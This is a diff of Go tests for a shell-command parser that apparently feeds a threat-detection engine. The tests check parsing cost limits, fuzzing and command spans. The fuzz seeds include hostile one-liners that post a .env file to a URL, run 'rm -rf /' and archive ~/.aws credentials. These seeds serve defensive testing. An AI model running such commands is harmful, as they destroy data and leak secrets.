@@ -2,6 +2,7 @@ package shellcmd
 
 import (
 	"errors"
+	"fmt"
 	"reflect"
 	"runtime"
 	"slices"
@@ -10,63 +11,37 @@ import (
 	"time"
 )
 
-// lineLimit is the longest command line the engine hands the parser
-// (threatrules.ParsedCommandsLimit, which this package cannot import).
-const lineLimit = 4096
-
-// wordsRead is the most words the commands of a line of n bytes can come to: a word for each
-// byte of the line and of the scripts read for it, and what braces may produce for the line
-// and for its scripts.
-func wordsRead(n int) int { return n + maxScriptBytes + 2*maxBraceWords }
-
-// read does with a command line everything a caller of this package does with one, and returns
-// the commands, which of them write a file's content, and Parse's error.
-func read(line string) (commands []Command, writes []bool, err error) {
-	commands, err = Parse(line)
-	if len(commands) == 0 {
-		return nil, nil, err
-	}
-	commands = WithScripts(commands, 3)
-	FileReads(commands)
-	SocketRedirects(commands)
-	FileEffects(commands)
-	writes = make([]bool, len(commands))
-	for i, c := range commands {
+// read reads a command line as a caller does (Read), and asks each command what a caller may.
+func read(line string) Line {
+	l := Read(line)
+	for _, c := range l.Commands {
 		c.Name()
 		c.ArgsText()
 		c.Unwrapped()
-		c.FileEffects()
-		c.WritesAreEffects()
-		c.Evaluated()
 		c.HereInput()
 		c.Script()
 		c.Carried()
-		for _, e := range c.FileWrites() {
-			if (e.Op == OpWrite || e.Op == OpAppend) && !strings.HasPrefix(e.Path, "/dev/") {
-				writes[i] = true
-			}
-		}
 	}
-	return commands, writes, err
+	return l
 }
 
 // hostileLines are command lines of the engine's limit built to cost the most: the same few
 // bytes repeated, constructs left open, and words that name many.
 func hostileLines() map[string]string {
-	fill := func(unit string) string { return strings.Repeat(unit, lineLimit/len(unit)) }
+	fill := func(unit string) string { return strings.Repeat(unit, LineLimit/len(unit)) }
 	return map[string]string{
 		"words":                   fill("a "),
 		"commands":                fill("a;"),
 		"pipeline":                fill("a|") + "a",
 		"and chain":               fill("a&&") + "a",
-		"function of commands":    "f(){ " + fill("a;")[:lineLimit-10] + " }",
-		"loop of commands":        "while x; do " + fill("a;")[:lineLimit-20] + " done",
+		"function of commands":    "f(){ " + fill("a;")[:LineLimit-10] + " }",
+		"loop of commands":        "while x; do " + fill("a;")[:LineLimit-20] + " done",
 		"open $(":                 fill("$("),
 		"open quoted $(":          fill("\"$("),
 		"open (":                  fill("("),
 		"open {":                  fill("{ "),
 		"open if":                 fill("if x;then "),
-		"open backticks":          fill("`a `")[:lineLimit-1],
+		"open backticks":          fill("`a `")[:LineLimit-1],
 		"nested $(":               strings.Repeat("$(", 1300) + "a" + strings.Repeat(")", 1300),
 		"nested (":                strings.Repeat("(", 2000) + "a" + strings.Repeat(")", 2000),
 		"substitutions in a word": "a " + fill("$(b)"),
@@ -91,6 +66,13 @@ func hostileLines() map[string]string {
 		"printf reusing a format": "printf '" + fill("a;")[:2000] + "%s' " + fill("x ")[:2000] + "| sh",
 		"printf over a sequence":  "printf '" + fill("a;")[:4000] + "%s' {1..1024} | sh",
 		"printf printing printf":  `printf 'printf "` + fill("a;")[:1500] + `%%s" ` + fill("y ")[:500] + `| sh;%s' ` + fill("x ")[:1900] + "| sh",
+		// Lines just within the bounds, which are read to their end.
+		"redirections at the bound":      strings.Repeat("a>b;", MaxCommands),
+		"writes then reads at the bound": strings.Repeat("tee f;cat f;", MaxCommands/2),
+		"exports at the bound":           strings.Repeat("export A=$B;", MaxCommands-1) + "a $A",
+		"scripts at the bound":           strings.Repeat("sh -c 'a|b';", MaxCommands/3),
+		"pipeline at the bound":          strings.Repeat("a|", MaxCommands-1) + "a",
+		"function at the bound":          "f(){ " + strings.Repeat("a;", MaxCommands) + " }",
 	}
 }
 
@@ -103,8 +85,7 @@ func TestHostileLinesAreCheapToRead(t *testing.T) {
 		var before, after runtime.MemStats
 		runtime.ReadMemStats(&before)
 		start := time.Now()
-		commands, writes, err := read(line)
-		spans := Spans(commands, writes)
+		l := read(line)
 		elapsed := time.Since(start)
 		runtime.ReadMemStats(&after)
 		if allocated := after.TotalAlloc - before.TotalAlloc; allocated > 64<<20 {
@@ -114,29 +95,60 @@ func TestHostileLinesAreCheapToRead(t *testing.T) {
 			t.Errorf("%s: reading %d bytes took %v", name, len(line), elapsed)
 		}
 		words := 0
-		for _, c := range commands {
+		for _, c := range l.Commands {
 			words += len(c.Argv)
 		}
-		if words > wordsRead(len(line)) {
-			t.Errorf("%s: %d words from %d bytes", name, words, len(line))
+		if pastBound(len(l.Commands), words) {
+			t.Errorf("%s: %d commands and %d words were read", name, len(l.Commands), words)
 		}
-		if len(spans) != len(commands) {
-			t.Errorf("%s: %d spans for %d commands", name, len(spans), len(commands))
+		if len(l.Spans) != len(l.Commands) {
+			t.Errorf("%s: %d spans for %d commands", name, len(l.Spans), len(l.Commands))
 		}
-		switch name {
-		case "braces doubled", "a long sequence", "sequences of a hundred":
-			if !errors.Is(err, ErrTooManyWords) || len(commands) != 0 {
-				t.Errorf("%s: %d commands, error %v; want none and ErrTooManyWords", name, len(commands), err)
+		switch {
+		case strings.HasSuffix(name, "at the bound"):
+			if l.Incomplete || len(l.Commands) == 0 {
+				t.Errorf("%s: %d commands, incomplete %v; want the line read", name, len(l.Commands), l.Incomplete)
 			}
-		case "open $(", "open quoted $(", "open (", "open {", "open if":
-			if err == nil || len(commands) != 0 {
-				t.Errorf("%s: %d commands, error %v; want none and an error", name, len(commands), err)
+		case name == "braces doubled", name == "a long sequence", name == "sequences of a hundred",
+			name == "small braces", strings.HasPrefix(name, "open "), name == "scripts of sequences",
+			strings.HasPrefix(name, "printf "), name == "commands", name == "shell scripts":
+			// Past a bound, or cut inside more constructs than are retried: not read at all.
+			if !l.Incomplete || len(l.Commands) != 0 {
+				t.Errorf("%s: %d commands, incomplete %v; want none, incomplete", name, len(l.Commands), l.Incomplete)
 			}
-		case "small braces":
-			// 1,364 words: more than the bound on what braces produce.
-			if !errors.Is(err, ErrTooManyWords) {
-				t.Errorf("%s: error %v, want ErrTooManyWords", name, err)
-			}
+		}
+	}
+}
+
+// A line is not read past a bound, and is read to its end within all of them: the brace
+// expansions of the line and of its scripts, the text of its scripts, its commands and their
+// words.
+func TestLineOfTooMuchIsNotRead(t *testing.T) {
+	for name, tc := range map[string]struct{ past, within string }{
+		"brace words of the line": {"echo {1..1025}", "echo {1..1024}"},
+		"brace words of scripts": {
+			"sh -c 'echo {1..1024}'; sh -c 'echo {1..2}'",
+			"sh -c 'echo {1..1022}'; sh -c 'echo {1..2}'",
+		},
+		"script bytes": {
+			"printf '" + strings.Repeat("x", 2000) + "%s\\n' {1..9} | sh",
+			"printf '" + strings.Repeat("x", 2000) + "%s\\n' {1..8} | sh",
+		},
+		"commands": {strings.Repeat("ls;", MaxCommands+1), strings.Repeat("ls;", MaxCommands)},
+		"commands of a script": {
+			"sh -c '" + strings.Repeat("ls;", MaxCommands) + "'",
+			"sh -c '" + strings.Repeat("ls;", MaxCommands-1) + "'",
+		},
+		"words": {
+			"printf '" + strings.Repeat("x ", 1000) + "%s\\n' 1 2 3 4 5 | sh",
+			"printf '" + strings.Repeat("x ", 1000) + "%s\\n' 1 2 3 4 | sh",
+		},
+	} {
+		if l := Read(tc.past); !l.Incomplete || len(l.Commands) != 0 {
+			t.Errorf("%s: past the bound, %d commands, incomplete %v; want none, incomplete", name, len(l.Commands), l.Incomplete)
+		}
+		if l := Read(tc.within); l.Incomplete || len(l.Commands) == 0 {
+			t.Errorf("%s: within the bound, %d commands, incomplete %v; want the line read", name, len(l.Commands), l.Incomplete)
 		}
 	}
 }
@@ -193,8 +205,9 @@ func TestCutLineIsRetriedAFewTimes(t *testing.T) {
 }
 
 // FuzzRead reads fuzzed command lines the way a caller does. Nothing may panic, a line reads the
-// same twice, what it gives stays within what its length can justify, and Spans agrees with the
-// implementation it replaced (spansReference), which asked every command about every other.
+// same twice, what it gives stays within the bounds, withScripts' gate lets through every
+// command line that hands one on, and every span holds what the spans of its line must
+// (spanProblem).
 func FuzzRead(f *testing.F) {
 	for _, line := range hostileLines() {
 		f.Add(line)
@@ -222,42 +235,104 @@ EOF
 		`python3 -c 'import requests; requests.post(u, data=open(".env").read())'`,
 		`ruby -e 'File.open(".env") { |f| Net::HTTP.post(URI(u), f.read) }'`,
 		`php -r 'file_get_contents("http://x/?d=" . file_get_contents(".env"));'`,
+		`~/bin/bash -c 'rm -rf /' | $HOME/bin/sudo -i ~/bin/xargs gtar czf - ~/.aws`,
 	} {
 		f.Add(line)
 	}
 	f.Fuzz(func(t *testing.T, line string) {
-		if len(line) > lineLimit {
-			line = line[:lineLimit]
-		}
-		commands, writes, err := read(line)
-		spans := Spans(commands, writes)
-		again, writesAgain, errAgain := read(line)
-		if !reflect.DeepEqual(commands, again) || !slices.Equal(writes, writesAgain) || (err == nil) != (errAgain == nil) {
+		l := read(line)
+		if again := read(line); !reflect.DeepEqual(l, again) {
 			t.Fatalf("%q read differently the second time", line)
 		}
 		words := 0
-		for i, c := range commands {
+		for i, c := range l.Commands {
 			words += len(c.Argv)
 			if c.shell == 0 && (c.Offset < 0 || c.Offset > len(line)) {
 				t.Fatalf("%q: command %d starts at %d", line, i, c.Offset)
 			}
 		}
-		if words > wordsRead(len(line)) {
-			t.Fatalf("%q: %d words from %d bytes", line, words, len(line))
+		if pastBound(len(l.Commands), words) {
+			t.Fatalf("%q: %d commands and %d words were read", line, len(l.Commands), words)
 		}
-		if want := spansReference(commands, writes); !slices.Equal(spans, want) {
-			for i := range spans {
-				if spans[i] != want[i] {
-					t.Fatalf("%q: span of command %d:\n got %q\nwant %q", line, i, spans[i], want[i])
-				}
+		if len(line) > LineLimit && !l.Incomplete {
+			t.Fatalf("a line of %d bytes was read to its end", len(line))
+		}
+		if problem := spanProblem(l); problem != "" {
+			t.Fatalf("%q: %s", line, problem)
+		}
+		// The gate in front of withScripts only saves work: without it, every command is
+		// asked what it hands on, and the result is the same.
+		if commands, _ := Parse(line[:min(len(line), LineLimit)]); len(commands) > 0 {
+			gated, ok := withScripts(commands, MaxDepth)
+			x := expander{scriptBytes: maxScriptBytes}
+			x.add(commands, 0, MaxDepth)
+			if ok == x.past || ok && !reflect.DeepEqual(gated, x.out) {
+				t.Fatalf("%q: withScripts gives %d commands (ok %v), every command asked gives %d (past %v)", line, len(gated), ok, len(x.out), x.past)
 			}
 		}
 	})
 }
 
-// Spans gives what the implementation before it gave, for the lines the other tests of the
-// package read and the hostile ones short enough for the old one to finish.
-func TestSpansAgreeWithReference(t *testing.T) {
+// What the spans of a command line must hold, whatever else they hold: the span of a command
+// of the line itself holds the command's own words, those of every earlier stage of its
+// pipeline before it, and those of every command before it that writes a file's content, and
+// it is the line from its start when the command takes a variable the line may have set; a
+// command a command line handed on has the span of the command of the line it came from.
+// Each piece of the line is in a span once: a span is no longer than its line twice over
+// (here-document bodies are both in the line and after the piece that names them). "" when
+// every span holds what it must.
+func spanProblem(l Line) string {
+	commands, spans := l.Commands, l.Spans
+	if len(spans) != len(commands) {
+		return fmt.Sprintf("%d spans for %d commands", len(spans), len(commands))
+	}
+	own := func(c *Command) string { return c.source[c.Offset:max(c.Offset, min(c.end, len(c.source)))] }
+	for i := range commands {
+		c := &commands[i]
+		if c.shell != 0 {
+			if top := topOf(commands, i); spans[i] != spans[top] {
+				return fmt.Sprintf("command %d has span %q, its line's command %d %q", i, spans[i], top, spans[top])
+			}
+			continue
+		}
+		span := spans[i]
+		if !strings.Contains(span, own(c)) {
+			return fmt.Sprintf("span %q of command %d lacks its words %q", span, i, own(c))
+		}
+		if len(span) > 2*len(c.source)+len(commands) {
+			return fmt.Sprintf("span of command %d is %d bytes, of a line of %d", i, len(span), len(c.source))
+		}
+		if takesVariable(commands, i) && !strings.HasPrefix(span, c.source[:c.Offset]) {
+			return fmt.Sprintf("span %q of command %d, which takes a variable, does not start the line", span, i)
+		}
+		for j := range commands {
+			d := &commands[j]
+			if d.shell != 0 || d.Offset >= c.Offset {
+				continue
+			}
+			reaches := d.Pipeline == c.Pipeline && d.Stage < c.Stage
+			for k := j; !reaches && k < len(commands) && topOf(commands, k) == j; k++ {
+				reaches = slices.ContainsFunc(l.Writes[k], FileEffect.writesContent)
+			}
+			if reaches && !strings.Contains(span, own(d)) {
+				return fmt.Sprintf("span %q of command %d lacks the words %q of command %d before it", span, i, own(d), j)
+			}
+		}
+	}
+	return ""
+}
+
+// topOf is the command of the line itself that commands[i] came from.
+func topOf(commands []Command, i int) int {
+	for commands[i].shell != 0 {
+		i = int(commands[i].shell) - 1
+	}
+	return i
+}
+
+// The spans of the lines the other tests of the package read, and of the hostile ones, hold
+// what they must (spanProblem).
+func TestSpansHoldWhatTheyMust(t *testing.T) {
 	lines := []string{
 		`git commit -m 'mention ./x.sh'; echo go | bash -c 'cat; ./x.sh'; echo end`,
 		`cat > x.sh <<EOF
@@ -275,127 +350,18 @@ y <<B
 2
 B`,
 	}
-	for name, line := range hostileLines() {
-		if !strings.HasPrefix(name, "open") {
-			lines = append(lines, line[:min(len(line), 600)])
-		}
+	for _, line := range hostileLines() {
+		lines = append(lines, line)
 	}
-	compared := 0
+	checked := 0
 	for _, line := range lines {
-		commands, writes, _ := read(line)
-		got, want := Spans(commands, writes), spansReference(commands, writes)
-		for i := range want {
-			compared++
-			if got[i] != want[i] {
-				t.Errorf("%q: span of command %d:\n got %q\nwant %q", line, i, got[i], want[i])
-				break
-			}
+		l := read(line)
+		checked += len(l.Commands)
+		if problem := spanProblem(l); problem != "" {
+			t.Errorf("%q: %s", line, problem)
 		}
 	}
-	if compared < 500 {
-		t.Fatalf("compared only %d spans", compared)
+	if checked < 1000 {
+		t.Fatalf("checked only %d spans", checked)
 	}
-}
-
-// spansReference is Spans as it was before it worked out each command's piece once: every
-// command asked about every other, and every piece about every command.
-func spansReference(commands []Command, writes []bool) []string {
-	out := make([]string, len(commands))
-	wrote := make([]bool, len(commands))
-	for i := range commands {
-		if i < len(writes) && writes[i] {
-			top := i
-			for commands[top].shell != 0 {
-				top = int(commands[top].shell) - 1
-			}
-			wrote[top] = true
-		}
-	}
-	ownPiece := func(i int) piece {
-		c := &commands[i]
-		p := piece{c.Offset, max(c.end, c.Offset)}
-		if c.scopeEnd > 0 {
-			p.start, p.end = min(p.start, c.scopeStart), max(p.end, c.scopeEnd)
-		}
-		for j := range commands {
-			if d := &commands[j]; d.shell == 0 && d.Offset < c.Offset && d.Pipeline == c.Pipeline && d.Stage < c.Stage {
-				p.start = min(p.start, d.Offset)
-			}
-		}
-		p.end = min(p.end, len(c.source))
-		p.start = min(p.start, p.end)
-		return p
-	}
-	spanText := func(source string, pieces []piece) string {
-		inside := func(offset int) bool {
-			return slices.ContainsFunc(pieces, func(p piece) bool { return offset >= p.start && offset < p.end })
-		}
-		var b *strings.Builder
-		for k, p := range pieces {
-			text := source[p.start:p.end]
-			if k > 0 {
-				b.WriteByte('\n')
-				b.WriteString(text)
-			}
-			for j := range commands {
-				d := &commands[j]
-				if d.shell != 0 || d.Offset < p.start || d.Offset >= p.end {
-					continue
-				}
-				for _, h := range d.hdocs {
-					if inside(h[0]) || h[1] >= len(d.Redirects) {
-						continue
-					}
-					if b == nil {
-						b = &strings.Builder{}
-						b.WriteString(text)
-					}
-					b.WriteByte('\n')
-					b.WriteString(d.Redirects[h[1]].Body)
-				}
-			}
-			if b == nil && len(pieces) > 1 {
-				b = &strings.Builder{}
-				b.WriteString(text)
-			}
-		}
-		if b == nil {
-			return source[pieces[0].start:pieces[0].end]
-		}
-		return b.String()
-	}
-	var pieces []piece
-	for i := range commands {
-		c := &commands[i]
-		if c.shell != 0 {
-			out[i] = out[c.shell-1]
-			continue
-		}
-		pieces = append(pieces[:0], ownPiece(i))
-		fromStart := takesVariable(commands, i)
-		for j := range commands {
-			if d := &commands[j]; d.shell == 0 && d.Offset < c.Offset && wrote[j] {
-				pieces = append(pieces, ownPiece(j))
-				fromStart = fromStart || takesVariable(commands, j)
-			}
-		}
-		slices.SortFunc(pieces, func(a, b piece) int { return a.start - b.start })
-		if fromStart {
-			last := pieces[0].end
-			for _, p := range pieces {
-				last = max(last, p.end)
-			}
-			pieces = append(pieces[:0], piece{0, last})
-		}
-		merged := pieces[:1]
-		for _, p := range pieces[1:] {
-			if last := &merged[len(merged)-1]; p.start <= last.end {
-				last.end = max(last.end, p.end)
-			} else {
-				merged = append(merged, p)
-			}
-		}
-		out[i] = spanText(c.source, merged)
-	}
-	return out
 }
